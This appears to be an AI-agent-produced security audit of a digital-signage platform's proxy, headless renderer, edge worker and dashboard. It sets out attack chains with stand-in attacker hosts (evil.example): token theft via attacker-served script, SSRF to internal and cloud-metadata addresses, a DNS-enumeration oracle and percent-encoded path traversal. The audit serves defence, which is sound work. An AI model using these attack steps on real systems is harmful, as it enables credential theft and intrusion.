# Remaining-Surfaces Audit — 2026-08-04

> **Scope:** the five surfaces the 10-surface program listed as **"Not covered."**
> 1. `RendererService` (Puppeteer) SSRF · 2. the proxy's HTML-rewriting pipeline ·
> 3. the baked in-board runtimes (`EDUCMS-SHIM-V*`, kiosk `_edit-shim.js`) ·
> 4. dashboard-side XSS (outside player/widget paths) · 5. `apps/edge/`.
>
> **Provenance:** one Opus agent, read-only, under the standing ground rules (evidence =
> `file:line` actually read; absence claims need two independent methods or they are labelled
> UNVERIFIED; guards traced to real callers; every finding self-refuted before reporting).
> Baseline `a74c7894`; the repo-wide greps ran in a fresh worktree at `cec023ec`.
> **Not independently re-verified by the lead.**
>
> **Tooling incident (disclosed for completeness):** this agent's isolation worktree was deleted
> mid-run, killing `Bash` for the remainder of the session. All file reads below were done directly
> via absolute path against the main checkout; the repo-wide `rg` sweeps (surface 4 in particular)
> were delegated to a second agent in a fresh worktree and are quoted from its raw output rather
> than run by me. Where that matters I say so inline.

---

## Posture per surface

| # | Surface | Posture | One-line rationale |
|---|---|---|---|
| 1 | `RendererService` (Puppeteer) SSRF | **WEAK** | `assertPublicUrl` **is** called on the top-level URL — but the sub-request/redirect guard is deliberately DNS-blind, and `page.goto` has no connect-time DNS pin, so both the redirect path and a rebind bypass it. |
| 2 | Proxy HTML-rewriting pipeline | **CRITICAL_GAPS** | The rewriter itself is sound (no injection found — `<base href>`/shim interpolation are provably escape-proof), but its **output is reachable at the web origin** through `apps/web/vercel.json`, which is the un-fixed half of `INJ-001`. |
| 3 | Baked in-board runtimes | **ADEQUATE** | Overrides land in `textContent` and a quote/paren-stripped `url()`; the inbound `educms-*` handler has no origin check but is genuinely frame-contained by the null-origin sandbox. The *action* path is separately hardened and holds. |
| 4 | Dashboard-side XSS | **STRONG** | All 5 real `dangerouslySetInnerHTML` sinks outside player/widget paths are DOMPurify-sanitized at the sink; zero `.innerHTML=`, zero `document.write`, zero `insertAdjacentHTML`, no unsanitized `srcDoc`. |
| 5 | `apps/edge/` | **ADEQUATE (not deployed)** | A Cloudflare Worker that reverse-proxies the Railway API plus a Supabase asset CDN. Prod routes are commented out, `ASSET_ORIGIN` is empty, and no CI deploys it. Three issues must be fixed **before** cutover. |

---

## Findings

### [CRITICAL] RS-01 — The proxy serves attacker HTML from the **web** origin; sandboxing the iframe did not close it

**Attacker:** anyone who can get an operator (or a kiosk browser) to open one link. No account, no auth.

**File:line**
- `apps/web/vercel.json:3-8`
- `apps/api/src/proxy/proxy.controller.ts:41`, `:60-65`, `:215-224`, `:637-644`
- Cross-ref: `docs/research/2026-08-01-player-security-audit/03-CONTENT-INJECTION.md:104`

**Evidence**

```json
// apps/web/vercel.json:3-8
"rewrites": [
  { "source": "/api/v1/:path*",
    "destination": "https://api-production-39a1.up.railway.app/api/v1/:path*" }
]
```

```ts
// proxy.controller.ts:637-644
res.setHeader('Content-Type', contentType);
res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
res.removeHeader('X-Frame-Options');
res.removeHeader('Content-Security-Policy');
res.setHeader('Content-Security-Policy', "frame-ancestors *");
res.setHeader('Access-Control-Allow-Origin', '*');
res.send(html);
```

```ts
// proxy.controller.ts:215  — interactive mode does NOT strip the upstream's scripts
if (!interactive) {
  html = html.replace(/<script\b[^>]*>[\s\S]*?<\/script\s*>/gi, '');
```

The lead already wrote this down as a footnote when grading `INJ-001`:

> `03-CONTENT-INJECTION.md:104` — *"Note `https://venue-os.app/api/v1/proxy/web?url=…` is same-origin and unauthenticated regardless."*

**Attack**
1. Attacker hosts `https://evil.example/x.html` containing ordinary `<script>`.
2. Sends an operator a link on the **vendor's own domain**:
   `https://<web-origin>/api/v1/proxy/web?url=https%3A%2F%2Fevil.example%2Fx.html&interactive=true`
3. Vercel rewrites the path to Railway (`vercel.json:3-8`). The response is served **to the browser from the web origin** — the rewrite is server-side, so the document's origin is the web app's.
4. `interactive=true` (`:215`) leaves the upstream scripts intact; `res.removeHeader('Content-Security-Policy')` + `setHeader(..., 'frame-ancestors *')` (`:640-641`) **replaces** Helmet's `script-src 'self'` with a policy that constrains nothing but framing. There is no CSP on the web route either (`INJ-002`).
5. This is a **top-level navigation**, so the `sandbox="allow-scripts …"` attribute added by the 2026-08-02 fix (`WidgetRenderer.tsx:4146`, `player/page.tsx:719`) never applies — that attribute lives on the *embedder*, not the response.
6. Attacker JS now runs with the web origin: reads `localStorage` (the operator JWT and, on a kiosk, the device token — key names per `03-CONTENT-INJECTION.md:30`, second-hand, not re-read by me), and can register a service worker at web-origin scope.

**Impact** Operator-JWT theft → the API accepts that Bearer token for `POST /api/v1/emergency/trigger`. Outcome is a **fake district-wide lockdown or a suppressed all-clear**, which is the CRITICAL anchor. On a kiosk the same page yields the device credential → single-screen takeover.

**Why this is not a duplicate of `INJ-001`:** `INJ-001`'s remediation was *"add `sandbox` to the iframe"* (`03-CONTENT-INJECTION.md:100`), and that shipped. The Vercel-rewrite variant is a different delivery path and is untouched by it. Treat this as a live residual, not a closed finding.

**Refutation attempted (does not hold):**
- *"`NEXT_PUBLIC_API_URL` is the absolute Railway host, so the frame is cross-origin."* True for the **iframe**, and it is why the lead downgraded `INJ-001` to HIGH. It is irrelevant here — the attacker types the web-origin URL directly and never uses the iframe.
- *"Helmet sets `script-src 'self'`."* Refuted at `proxy.controller.ts:640-641`: the controller `removeHeader`s it and sets a framing-only policy. Confirmed by the existing test `proxy.controller.spec.ts:94` — `expect(res.headers['content-security-policy']).toBe('frame-ancestors *')`.
- *"Static mode strips scripts."* Only `!interactive` (`:215`), and the attacker chooses the query string. The static strip is also not a sanitizer — `/\s(on\w+)\s*=\s*["'][^"']*["']/gi` (`:222`) requires **quoted** handler values, so `<img src=x onerror=…>` survives it.

**Fix (breaking, and that is fine at zero customers)** Pick one, in preference order:
1. **Serve the proxy from a separate origin** (e.g. `proxy.venueos.app` / a `*.workers.dev` sandbox host) and **delete the `/api/v1/proxy/web` case from the Vercel rewrite** so it is unreachable at the web origin. This is the fix `03-CONTENT-INJECTION.md:36` already recommended and is the only one that is robust.
2. Failing that, add `Content-Security-Policy: sandbox allow-scripts` to the proxy response — the CSP `sandbox` directive applies to **top-level** documents too, unlike the iframe attribute, and forces the response into a null origin however it is loaded. Cheap, one line, no client change. (Verify against a real Taurus unit; CSP `sandbox` is CSP1 and safe on Chromium 83.)
3. Add `X-Content-Type-Options: nosniff` and a `Content-Disposition` guard on the non-HTML relay branch regardless.

**Confidence:** HIGH for the chain up to step 5 (every line read directly). MEDIUM for step 6's exact localStorage key names (taken from the prior audit, not re-read).
**Verification methods:** (a) read `apps/web/vercel.json` in full; (b) read the controller's header block and the existing spec assertion that pins `frame-ancestors *`; (c) the lead's own independent note at `03-CONTENT-INJECTION.md:104`.
**Live check (30 s):** `curl -is 'https://<web-origin>/api/v1/proxy/web?url=https://example.com&interactive=true' | head -30` — look for `content-security-policy: frame-ancestors *` and `x-educms-mode: interactive` coming back from the **web** host.

---

### [HIGH] RS-02 — `RendererService`'s SSRF guard is DNS-blind on redirects and has no connect-time pin

**Attacker:** unauthenticated; the endpoint is public by design (`proxy.controller.ts:50-59`).

**File:line** `apps/api/src/proxy/renderer.service.ts:122-127`, `:148-172`, `:177-188`; `apps/api/src/branding/safe-fetch.ts:75-80`, `:94-111`, `:113-121`

**Evidence** — the guard **is** wired (the brief's first question answered: yes, `assertPublicUrl` is really called):

```ts
// renderer.service.ts:122-127
try {
  await assertPublicUrl(url);
} catch (e: any) {
  this.logger.warn(`[ssr] SSRF guard rejected url=${url.slice(0, 80)}: ${e?.message}`);
  return null;
}
```

But every *sub*-request — which includes each hop of a redirect chain — is checked by the **synchronous** half only, and the code says so:

```ts
// renderer.service.ts:157-163
// resources. validatePublicUrl is the synchronous half of the
// check — it rejects file://, non-80/443 ports, and private IP
// LITERALS without a DNS round-trip (one per sub-request would
// be too slow). The top-level URL already passed the full
// DNS-resolving assertPublicUrl above.
try { validatePublicUrl(req.url()); }
```

```ts
// safe-fetch.ts:75-80
// If the hostname is an IP literal, check immediately. Otherwise we
// defer the DNS check to safeFetch so a single URL validation can be
// done without side-effects.
if (isIP(u.hostname) && isPrivateIp(u.hostname)) {
```

And `safeFetch` documents the exact defence the renderer cannot have:

```ts
// safe-fetch.ts:113-119
* net.LookupFunction that re-resolves at CONNECT TIME and rejects any
* private/loopback/link-local address. Wired into the http(s) request's
* `lookup` option so the socket only ever connects to an address THIS
* validates — closing the DNS-rebind TOCTOU …
```

`page.goto` (`renderer.service.ts:177`) takes no `lookup` hook; Chromium resolves independently of the Node `dns.lookup` that `assertPublicUrl` performed.

**Attack (variant A — a plain 302, no rebinding infrastructure needed)**
1. `GET /api/v1/proxy/web?url=https://evil.example/` (omit `interactive` so the SSR branch runs — `proxy.controller.ts:123`).
2. `assertPublicUrl` resolves `evil.example` → a public IP. Passes.
3. `evil.example` answers `302 Location: http://intranet-name.evil.example/` where that name has an A record for `10.x.x.x` (or `metadata.google.internal` → `169.254.169.254`).
4. Chromium follows it. The interception handler runs `validatePublicUrl`, which — per its own comment — checks scheme, port and **IP literals only**. A *hostname* that resolves privately sails through.
5. `page.content()` (`:187`) captures the internal service's DOM; the controller returns it to the caller (`proxy.controller.ts:125-128` → `:644`) and caches it for 10 minutes.

**Attack (variant B — rebind on the top-level URL)** Serve `evil.example` with a 1-second TTL; answer the `assertPublicUrl` lookup with a public IP and Chromium's own lookup with `169.254.169.254`. No redirect required.

Both variants land at the same place, and the argument is robust to a detail I could not test without a shell: **it does not matter whether Puppeteer re-fires the `request` event on a redirect.** If it does, the check that runs is DNS-blind (variant A). If it does not, no check runs at all — which is strictly worse.

**Impact** Unauthenticated **read**-SSRF with full body exfiltration into the internal network. Bounded by the port allowlist (`safe-fetch.ts:72-73`, 80/443 only), so Redis/Postgres are out of reach; internal HTTP services and DNS-named metadata endpoints are in reach. Not a screen-takeover, so HIGH rather than CRITICAL.

**Fix** (a) Resolve the hostname in the interception handler and reject private results — the DNS cost is real, so cache resolutions per render (a `Map<host, boolean>` with a short TTL) instead of skipping the check. (b) Pin the browser's resolution with `--host-resolver-rules=MAP <validated-host> <validated-ip>` for exactly the host and IP `assertPublicUrl` approved, which closes the rebind window the same way `ssrfSafeLookup` does for `safeFetch`. (c) Cap the redirect chain and re-run the **full** `assertPublicUrl` on every `document`-type request.

**Confidence:** HIGH that the guard is DNS-blind for sub-requests (stated in-code at `:157-161` and confirmed at `safe-fetch.ts:75-80`). HIGH that no connect-time pin exists on `page.goto`. MEDIUM on exploitability in this specific deploy — see the SSR-liveness caveat below.

**SSR-liveness caveat (material, please check):** `RendererService` is a real provider (`app.module.ts:243`) and the Dockerfile installs Chromium (`Dockerfile:79-89`) and sets `PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser` (`:96-97`). But that path is a guess about Alpine's layout that I could not test. If it is wrong, `puppeteer.launch` throws, `getBrowser()` returns `null` (`renderer.service.ts:253-257`), and **every** request silently falls back to `safeFetch` — in which case RS-02, RS-04 and RS-05 are all latent rather than live. **One command settles it:** `curl -is '<api>/api/v1/proxy/web?url=https://example.com' | grep -i x-educms-renderer` → `ssr` means live, `fetch` means the renderer never launched.

**Verification methods:** (1) read `renderer.service.ts` end-to-end; (2) read `safe-fetch.ts` end-to-end and compared the two guards' contracts; (3) confirmed reachability of the non-interactive branch at `proxy.controller.ts:123` against the three client call sites, all of which pass `interactive=true` (`WidgetRenderer.tsx:4063`, `TouchOverlay.tsx:88`, `player/page.tsx:7789`) — so the SSR branch is only ever entered by a caller who chose to omit it.

---

### [MEDIUM] RS-03 — The proxy reflects *why* an SSRF was blocked, including the resolved private IP

**Attacker:** unauthenticated, 60 requests/min/IP.

**File:line** `apps/api/src/proxy/proxy.controller.ts:142-147`, `:659-677`; `apps/api/src/branding/safe-fetch.ts:100-103`

**Evidence** — the comment states the intent, the code does the opposite:

```ts
// proxy.controller.ts:143-147
if (e instanceof SsrfError) {
  // Don't leak whether the target was private vs invalid —
  // uniform error for SSRF probing.
  throw new HttpException({ code: 'PROXY_UPSTREAM_BLOCKED', message: `Upstream blocked: ${e.message}` }, HttpStatus.BAD_REQUEST);
}
```

```ts
// safe-fetch.ts:100-103
for (const r of results) {
  if (isPrivateIp(r.address)) {
    throw new SsrfError(`DNS for ${url.hostname} resolved to private range (${r.address})`);
```

`e.message` is interpolated verbatim, then rendered into the error page at `:677`/`:693`. (The HTML-escape at `:670-676` protects against XSS but does nothing about the disclosure.)

**Attack** `GET /api/v1/proxy/web?url=http://<guessed-internal-name>/` and read the body. A resolvable internal name returns `Upstream blocked: DNS for <name> resolved to private range (10.1.2.3)`; a non-existent one returns `DNS lookup failed for <name>`; a public one returns an upstream error. That is a clean three-way oracle for enumerating internal DNS **and** mapping names to private IPs — the reconnaissance step that makes RS-02 targetable.

**Impact** Internal-network reconnaissance from the public internet. Not exploitation on its own, hence MEDIUM.

**Fix** Make the intent match the code: return a fixed string (`'Upstream blocked'`) for every `SsrfError`, and log the detailed reason server-side only. One-line change at `:146`.

**Confidence:** HIGH. **Verification methods:** (1) read both files; (2) traced `HttpException` → the `catch` block at `:645-697` and confirmed `err.message` is what NestJS's `initMessage` surfaces for an object response carrying a string `message`.

---

### [MEDIUM] RS-04 — SSR captures page HTML with no byte cap and caches up to 200 of them

**Attacker:** unauthenticated.

**File:line** `apps/api/src/proxy/renderer.service.ts:58`, `:66`, `:93-102`, `:187`

**Evidence**

```ts
// renderer.service.ts:187
const html = await page.content();
```

```ts
// renderer.service.ts:66
private readonly MAX_CACHE_ENTRIES = 200;              // prevent unbounded growth
```

```ts
// renderer.service.ts:95-101 — trimming is by ENTRY COUNT, never by bytes
if (this.cache.size >= this.MAX_CACHE_ENTRIES) {
  const oldest = [...this.cache.entries()].sort((a, b) => a[1].renderedAt - b[1].renderedAt)[0];
  if (oldest) this.cache.delete(oldest[0]);
}
this.cache.set(url, result);
```

The `safeFetch` fallback path *is* capped — `maxBytes: 10 * 1024 * 1024` (`proxy.controller.ts:137`) — so the SSR branch is the outlier.

**Attack** Host a page whose JS builds a multi-hundred-MB DOM inside the 15 s + 2 s render window (`:179`, `:185`). `page.content()` materialises the whole serialisation into the Node heap and then pins it in `this.cache` for 10 minutes. Repeat with distinct `?url=` values (each is a distinct cache key) until the container OOMs.

**Impact** The API process that OOMs is the same one that serves `/emergency/trigger`, the WS gateway and the manifest poll. Railway restarts it (10 retries), so this is a repeated outage window on a life-safety surface rather than a permanent one — MEDIUM.

**Fix** Cap the capture (`page.evaluate(() => document.documentElement.outerHTML.slice(0, N))`, or check `document.documentElement.outerHTML.length` before returning) and account the cache in **bytes**, evicting on a total-size budget rather than an entry count.

**Confidence:** HIGH (read directly; the absence of a cap is a positive reading of the whole method, not an absence claim). **Verification methods:** (1) read `renderOnce` end-to-end; (2) compared against the explicit `maxBytes` on the sibling `safeFetch` call.

---

### [MEDIUM] RS-05 — Chromium renders attacker-controlled pages with `--no-sandbox --single-process --ignore-certificate-errors`

**File:line** `apps/api/src/proxy/renderer.service.ts:228-247`

**Evidence**

```ts
// renderer.service.ts:229-244
'--no-sandbox',
'--disable-setuid-sandbox',
…
'--no-zygote',
'--single-process',
…
'--ignore-certificate-errors',
```

**Impact** `--single-process` collapses the renderer into the browser process, and `--no-sandbox` removes the OS confinement, so a Chromium renderer bug reached by a hostile page is immediately code execution as the API container's user — with `DATABASE_URL`, `JWT_SECRET`, `DEVICE_JWT_SECRET` and `SUPABASE_SERVICE_ROLE_KEY` in its environment. `--ignore-certificate-errors` additionally means a MITM or a self-signed internal endpoint is accepted silently, widening RS-02's reachable set. This needs a Chromium n-day, so it is defence-in-depth — but it is the standard hardening item for "headless browser fetching arbitrary URLs" and the blast radius here is total.

**Fix** Drop `--single-process` (it is the flag that removes site isolation and it is not needed for memory on a 3-render cap). Run the container as a non-root user with a proper user namespace so the sandbox can be re-enabled — the code comment at `:229-232` says the sandbox was disabled for container UX, not because it is impossible. Remove `--ignore-certificate-errors`, or scope it behind an env flag that is off in production. Pin and track the Alpine `chromium` version (`Dockerfile:81`) rather than taking floating latest.

**Confidence:** HIGH on the configuration; MEDIUM on practical exploitability (needs an unpatched renderer bug). **Verification methods:** (1) read the launch args; (2) read `Dockerfile:69-97` to confirm the binary is the distro package with no version pin.

---

### [MEDIUM] RS-06 — Deploying `apps/edge` in front of Railway silently corrupts the throttle key and the audit IP

**File:line** `apps/edge/src/index.ts:138-157`; `apps/api/src/security/client-ip.ts:28-56`; `apps/api/src/main.ts:65`

**Evidence** — the API selects the client IP by counting `X-Forwarded-For` entries **from the right** using a configured trusted-appender count:

```
// client-ip.ts:35-37
*   honest:  [client, edge]                    len 2, N 2 → index 0 = client ✓
*   spoofed: [FAKE, client, edge]              len 3, N 2 → index 1 = client ✓
```

```
// client-ip.ts:48-53
* `TRUSTED_PROXY_HOPS` (env, integer >= 1, default 2) is that count. The
* default matches the measured production chain above — Railway edge + one
* internal hop, i.e. TWO appenders. A deployment whose chain differs (an extra
* CDN/WAF in front, or none at all) MUST set it …
```

The worker adds exactly such an appender and forwards headers wholesale:

```ts
// apps/edge/src/index.ts:145-150
const init: RequestInit = {
  method: req.method,
  headers: req.headers,
```

**Attack / failure** With Cloudflare in front, the honest header becomes `[client, cf-pop, railway-edge]` (len 3) while `TRUSTED_PROXY_HOPS` still says 2 → index `3-2 = 1` → the API selects **the Cloudflare PoP address** for every request. Consequences, both silent: every client behind that PoP shares one throttle bucket (per-IP brute-force caps become effectively global, and legitimate districts 429 each other), and **`AuditLog.ipAddress` for an emergency trigger records the CDN, not the person who fired it** — the exact forensic-integrity failure `client-ip.ts:19-26` was written to fix.

**Impact** Not exploitable today (the worker is not deployed — see RS-07 evidence), but it is a loaded gun on the cutover checklist, and the failure mode is invisible. MEDIUM, deployment-gated.

**Fix** Add to `apps/edge/README.md`'s cutover plan, as a blocking step: *"set `TRUSTED_PROXY_HOPS=3` on Railway **before** binding the worker route, then verify against a real request's `X-Forwarded-For`."* Better: have the worker set a single canonical header (`cf-connecting-ip`) and teach `clientIpFromRequest` to prefer it when a `TRUST_CF_CONNECTING_IP` env flag is set, which removes the counting fragility entirely.

**Confidence:** HIGH. **Verification methods:** (1) read `client-ip.ts`'s full contract; (2) read the worker's `proxyToOrigin`; (3) CLAUDE.md's `TRUSTED_PROXY_HOPS` row states the same coupling independently.

---

### [LOW] RS-07 — Percent-encoded path traversal in the edge asset proxy

**File:line** `apps/edge/src/index.ts:184-188`, `:310-334`, `:394-395`

**Evidence**

```ts
// apps/edge/src/index.ts:184-188
function buildUpstreamUrl(path: string, assetOrigin: string): string {
  const rest = path.slice(CDN_PREFIX.length); // strip leading /cdn/assets/
  const base = assetOrigin.replace(/\/+$/, '');
  return `${base}/${rest}`;
}
```

`path` is `new URL(req.url).pathname` (`:310`, `:334`). The WHATWG URL parser does **not** decode `%2e` when producing `pathname`, so `/cdn/assets/%2e%2e/%2e%2e/x` survives the `CDN_PREFIX` check at `:458` intact — but the subsequent `fetch(upstreamUrl)` (`:354`) re-parses the string, and at *that* point `%2e%2e` is treated as a double-dot path segment and collapsed.

**Attack** `GET /cdn/assets/%2e%2e/%2e%2e/<other-public-bucket>/<path>` escapes the `…/object/public/assets` prefix and is then cached at the edge for a year with `access-control-allow-origin: *` (`:214-224`).

**Impact** Low. Reachable only when `ASSET_ORIGIN` is configured (it is `""` — `wrangler.toml`), no credentials are forwarded to the origin (`upstreamHeaders` is an empty `Headers` — `:339`), so only *other public* Supabase buckets and unauthenticated endpoints are in reach. Still: it lets an attacker pin arbitrary chosen content into your CDN cache under your hostname.

**Fix** Reject any `rest` containing `%2e`/`%2E`/`..` outright, or normalise with `new URL(rest, base)` and assert the result still starts with the `ASSET_ORIGIN` prefix.

**Confidence:** MEDIUM. The code path is read and certain; the WHATWG `%2e`-as-dot-segment behaviour is asserted from the URL spec and **was not empirically tested** (no shell). **Label the empirical half UNVERIFIED** — settle it with `node -e "console.log(new URL('https://h/a/b/%2e%2e/%2e%2e/c').toString())"`.

---

### [LOW] RS-08 — `/api/v1/proxy/web` is an open, unauthenticated CORS-bypass relay

**File:line** `apps/api/src/proxy/proxy.controller.ts:160-177`

**Evidence**

```ts
// proxy.controller.ts:173-176
res.setHeader('Content-Type', contentType);
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Cache-Control', 'public, max-age=300');
res.send(upstream.body);
```

`contentType` is `upstream.contentType` (`:158`) — i.e. attacker-chosen.

**Impact** Any third-party site can use your API to read cross-origin resources that CORS would otherwise deny, using your Railway egress IP (defeating any IP-allowlisted third party), and to host arbitrary bytes with an arbitrary `Content-Type` on your domain — including `application/javascript`, which makes the endpoint a same-origin script source (a service-worker registration source too, though the scope is confined to `/api/v1/proxy/`). Throttled at 60/min/IP (`:60`). Independent of RS-01 but compounds it.

**Fix** Restrict the relay branch to an image/media/font/JSON allowlist and force `Content-Type` to a normalised safe value; add `X-Content-Type-Options: nosniff`; drop `Access-Control-Allow-Origin: *` in favour of the API's own `ALLOWED_ORIGINS`. Solving RS-01 by moving the proxy to a separate origin also defuses the script-source half of this.

**Confidence:** HIGH. **Verification methods:** (1) read the branch; (2) confirmed the controller carries no `@UseGuards` and the only global `APP_GUARD` is the throttler (`app.module.ts:255-256`), corroborated by the controller's own comment at `:51-53` ("the proxy stays publicly reachable").

---

### [LOW] RS-09 — Assessment of the known `<base href>` bug: functional, not an escalation

The brief asked me to assess this specifically. **It is real, and it is not a security escalation.**

**File:line** `apps/api/src/proxy/proxy.controller.ts:415`, `:463`, `:472`, `:624`

**Evidence**

```ts
// proxy.controller.ts:624
const headInjection = `<base href="${baseUrl}">…`;
```
```js
// proxy.controller.ts:463, :472  (inside the injected shim)
var PROXY='/api/v1/proxy/web';
…
return PROXY+'?url='+encodeURIComponent(u.toString())+'&v=2&interactive=true';
```

`/api/v1/proxy/web` is root-relative, and a root-relative URL resolves against the **base URL's origin**. With `<base href="https://upstream/…">`, every wrapped `fetch`/XHR/`window.open`/`location.href`/anchor target — and the server-side anchor rewrite at `:415`, which emits the same root-relative form — resolves to `https://upstream/api/v1/proxy/web?url=…` instead of ours.

**Security impact — assessed as LOW:**
- The requests never reach our server, so **no SSRF is created**; the browser is the fetcher.
- Navigations stay inside the frame: the sandbox string is `allow-scripts allow-popups-to-escape-sandbox` (`player/page.tsx:719`, `WidgetRenderer.tsx:4146`) with no `allow-top-navigation` and no `allow-popups`, so the frame cannot escape whatever it resolves to.
- The one genuine leak: `wrap()` puts the **absolute target URL** in the path of a request sent to `upstream`, so if a page XHRs a *third-party* endpoint (with a token in the query), that third-party URL is disclosed to the upstream operator.
- The real cost is functional: the shim's entire stated purpose (`:459-461` — route XHRs back through the proxy so `Access-Control-Allow-Origin: *` satisfies the null origin) is defeated, and every rewritten link 404s on upstream. Interactive mode is quietly not doing what its comments claim.

**Fix** Make `PROXY` absolute at injection time — `var PROXY=${JSON.stringify(new URL('/api/v1/proxy/web', selfOrigin).toString())}` — and emit the same absolute form from the server-side anchor rewrite at `:415`. Note `baseUrl` itself is safe to interpolate: it is always a `URL`-normalised string (`safeFetch` returns `url.toString()`; the SSR path returns `page.url()`), and the WHATWG serialiser percent-encodes `"`, `<` and `>` in path, query, fragment and userinfo — I verified this empirically before the shell died (`new URL('https://example.com/?a="><script>').toString()` → `…?a=%22%3E%3Cscript%3E`). So neither the `<base href="…">` attribute nor the `JSON.stringify(baseUrl)` inside the `<script>` at `:464` is an injection point. **Attempted and refuted.**

**Confidence:** HIGH.

---

### [LOW] RS-10 — `PropertiesPanel`'s `message` handler validates neither `event.source` nor `event.origin`

**File:line** `apps/web/src/components/template-builder/PropertiesPanel.tsx:7228-7256`

**Evidence** (quoted from the sweep)

```ts
// PropertiesPanel.tsx:7228-7232
const onMsg = (e: MessageEvent) => {
  const d = e.data as { type?: string; key?: string; kind?: string } | null;
  if (!d || typeof d !== 'object') return;
  if (d.type === 'educms-ready') {
    try { (e.source as Window | null)?.postMessage({ type: 'educms-edit-mode', on: true }, '*'); } catch { /* ignore */ }
```

This is the **only** `window`-level `message` handler in `apps/web/src` with no source *and* no origin check. Every sibling is gated: `player/page.tsx:6096` binds `event.source` through the kiosk registry, `HolidayWidget.tsx:200-209` checks source unconditionally **and** origin, `webpage-spatial-nav.ts:194` checks source.

**Attack** A hostile board frame in the builder (reachable because `EXTERNAL_HTML`/`WEBPAGE` `config.url` has no server-side allowlist — `03-CONTENT-INJECTION.md:57`, `:60`) posts `{type:'educms-ready'}` and receives an `educms-edit-mode {on:true}` reply, or posts `educms-field-click` to force the panel to scroll and focus an arbitrary field row.

**Impact** Operator-UI nuisance in the builder only. It cannot reach the action path — that is the player's separate, source-bound handler.

**Refutation that holds:** the `key` is *not* a selector-injection vector. `safeKey = d.key.replace(/"/g, '')` (`:7236`) removes the only character that could terminate the quoted attribute value in `[data-edit-field="${safeKey}"]`; a `]` inside the quotes is literal, and the whole `querySelector` is `try`-wrapped (`:7243`).

**Fix** Mirror `HolidayWidget.tsx:200-201`: keep a ref to the preview iframe and require `e.source === ref.current?.contentWindow`.

**Confidence:** HIGH (raw grep with 12 lines of context on all 7 handlers in the tree).

---

### [LOW] RS-11 — The baked board runtimes accept `educms-*` from any sender (frame-contained, by design)

**File:line** `apps/web/scripts/inject-shim-v2.cjs:148` (bakes `EDUCMS-SHIM-V7`, marker at `:53`); `apps/api/src/ai/designer-edit-shim.ts:15` (`EDUCMS-SHIM-V6`, same body minus the `hidden` key); `apps/web/public/templates/kiosk/_edit-shim.js:198-202`

**Evidence**

```js
// inject-shim-v2.cjs:148
addEventListener('message',function(e){try{var d=e.data;if(!d||typeof d!=='object')return;if(d.type==='educms-overrides'){…}else if(d.type==='educms-edit-mode'){editMode=!!d.on;…}}catch(_){}});
```

No `e.origin`, no `e.source`. Outbound posts use `targetOrigin:'*'` (`:143`, `:147`).

**Why it is contained, and I checked rather than assumed:**
- Every mount is `sandbox="allow-scripts"` with **no** `allow-same-origin` and no `allow-popups` (`WidgetRenderer.tsx:3984`, `:4012`, `:4146`; `player/page.tsx:719`), so the only window that holds a handle to the frame is its embedder. There is no opener and the frame cannot create one.
- The override sinks are safe on their own terms: text goes through `el.textContent` (`inject-shim-v2.cjs:141`), entity-decoding uses a **detached** `<textarea>` whose content is RCDATA (`:140`) — the standard safe idiom, no element is ever constructed — and image URLs are stripped of `["'()\s]` before entering `url('…')` / `src` (`:142`), so neither the CSS `url()` context nor an `<img>` yields script (`javascript:` and `data:image/svg+xml` do not execute in an `<img>`).
- The privileged consumer — `educms-action` → `dispatchTouchAction` — is **not** in these shims. It is in the kiosk shim only (`_edit-shim.js:178`), and the parent gate is sound (see "What's already strong").

**Impact** None reachable today. Reported so the containment argument is on the record: if any of those three sandbox attributes is ever relaxed, or a board is ever loaded top-level with an attacker-controlled `?text=`/`?img=`, this handler becomes the entry point.

**Fix (defence-in-depth)** Add `if (e.source !== window.parent) return;` to all three shims. One line, and it costs nothing — the parent is the only legitimate sender in every current mount.

**Confidence:** HIGH.

**One non-security note surfaced by the sweep:** of 193 board `.html` files, 134 carry `EDUCMS-SHIM-V7`, 9 carry `V6`, 31 still carry `V5`, and 19 load `_edit-shim.js` — 193 accounted for, no un-shimmed board. `TRUSTED_RUNTIMES` in `designer-safe-srcdoc.ts:74-80` pins `V6` but not `V7`; that is **correct**, because the registry governs only `srcdoc` AI-Designer boards (shimmed server-side with the `V6` constant), while the 134 static boards load by `src=` and never pass through `buildSafeDesignerSrcdoc`. The only consequence is functional: pasting a V7-shimmed static board into `config.html` would strip its shim and silently lose editability.

---

### [LOW] RS-12 — `PdfHoverThumb` frames a tenant-controlled asset URL with no `sandbox`

**File:line** `apps/web/src/components/assets/PdfHoverThumb.tsx:112`, `:134-138`

**Evidence** (from the sweep) `src={src}` where `const src = makePdfPreviewUrl(fileUrl)`; no `sandbox` attribute, deliberately — the sibling comment at `PlaylistPreviewThumb.tsx:274` records *"Fix: render the iframe with NO sandbox attribute"*, which matches the 4-cell sandbox probe documented at `player/page.tsx:7826-7838` (Chrome's PDF viewer paints in the unsandboxed cell only).

**Impact** An unsandboxed frame carries no `allow-top-navigation` restriction, so if a tenant-uploaded "PDF" is ever served as HTML it can navigate the operator's whole dashboard tab to a phishing page. This is gated by the asset approval flow and the upload MIME allowlist, which `03-CONTENT-INJECTION.md:66-68` grades as holding — **I did not re-trace that gate**, so treat this as a hardening note, not a live chain.

**Fix** `sandbox="allow-scripts allow-same-origin"` still breaks the PDF viewer, but `sandbox="allow-scripts allow-same-origin allow-downloads"` is worth one probe; failing that, serve previews from a dedicated asset origin so top-navigation is the only residual and add `Content-Security-Policy: sandbox` on the storage response.

**Confidence:** MEDIUM (grep evidence + the recorded rationale; the MIME gate is untraced).

---

### [INFO] RS-13 — `BrandingSettingsCard`'s SVG sink relies on a caller contract

**File:line** `apps/web/src/components/settings/BrandingSettingsCard.tsx:85-94`, `:289`, `:503`

`dangerouslySetInnerHTML={{ __html: logoSvg! }}` takes a bare `string | null` **prop**. The current caller sanitises (`:85-94`, DOMPurify SVG profile, `FORBID_TAGS: ['script','style','foreignObject']`), so it is safe today — but the safety lives in the caller, not the sink, and the non-null assertion hides it. Rename the prop `sanitizedLogoSvg` or sanitise inside the component. No action required for launch.

---

### [LOW] RS-14 — The edge worker answers every CORS preflight permissively, ahead of the API's allowlist

**File:line** `apps/edge/src/index.ts:443-455`

```ts
'access-control-allow-origin': req.headers.get('origin') || '*',
'access-control-allow-headers': req.headers.get('access-control-request-headers') || 'authorization, content-type',
'access-control-allow-credentials': 'true',
```

